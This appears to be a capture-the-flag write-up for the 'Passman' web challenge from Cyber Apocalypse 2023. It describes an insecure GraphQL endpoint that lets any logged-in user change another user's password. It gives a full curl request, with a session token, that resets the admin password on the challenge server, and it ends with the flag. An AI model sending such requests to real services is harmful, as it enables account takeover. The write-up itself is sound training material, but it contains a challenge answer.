# Cyber Apocalypse 2023

## Passman

> Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?
>
>  Author: N/A
>
> [`web_passman.zip`](web_passman.zip)

Tags: _web_

## Solution
While inspecting the source code we can find a weak graphql endpoint that allows to change user data for any user. The endpoint is only available for authenticated users but creating a new user is easily done.

![createuser](image001.png)

After this we can take the session id of the newly created user to send a update call to the `graphql` endpoint.

```bash
$ curl -X POST -H "Content-Type:application/json" -d '{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"test"}}' --cookie "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5NTc0ODk0fQ.mOgumzswX-rEm9_222nfGZ__ur29vovSQT3jrYLj_us" http://104.248.169.117:30
522/graphql
{"data":{"UpdatePassword":{"message":"Password updated successfully!","token":null}}}
```

Now admins password is set to `test` we can login as `admin` and retrieve the flag.
![flag](image002.png)

Flag `HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}`